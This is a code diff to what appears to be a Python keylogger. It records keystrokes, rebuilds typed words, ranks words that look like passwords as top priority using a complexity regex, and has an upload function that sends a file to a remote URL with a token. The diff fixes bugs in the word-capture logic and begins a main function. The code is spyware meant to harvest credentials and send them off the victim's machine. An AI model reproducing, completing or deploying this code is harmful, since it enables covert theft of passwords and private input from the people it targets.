@@ -34,8 +34,8 @@ def word_priority_predictor(word: Word)->int:
     #Matches any string that includes a mix of uppercase and lowercase letters, numbers, and special characters, which is usually a password requirement
     special_char_regex = re.compile(r'^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-])\S+$')
 
-    if length_regex.match(word):
-        if special_char_regex.match(word):
+    if length_regex.match(word.letters):
+        if special_char_regex.match(word.letters):
             word.priority = 0
         else:
             word.priority = 1
@@ -47,7 +47,7 @@ def read_word_being_typed(word: Word, event: keyboard.KeyboardEvent):
         word_priority_predictor(word)
         word.status = True
     elif event.name == "backspace":
-        word = word[:-1] if word else "" #To avoid an IndexError for cases where the string is empty
+        word.letters = word.letters[:-1] if word.letters else "" #To avoid an IndexError for cases where the string is empty
     else:
         #Update the word string if only one character was entered, to avoid saving keyboard events like ctrl, shift etc
         if len(event.name)==1:
@@ -78,5 +78,6 @@ def upload(file_path:str, file_name:str, url:str, token:str)->bool:
     return response.json()["status"]
 
 
-    
+def main():
+
 
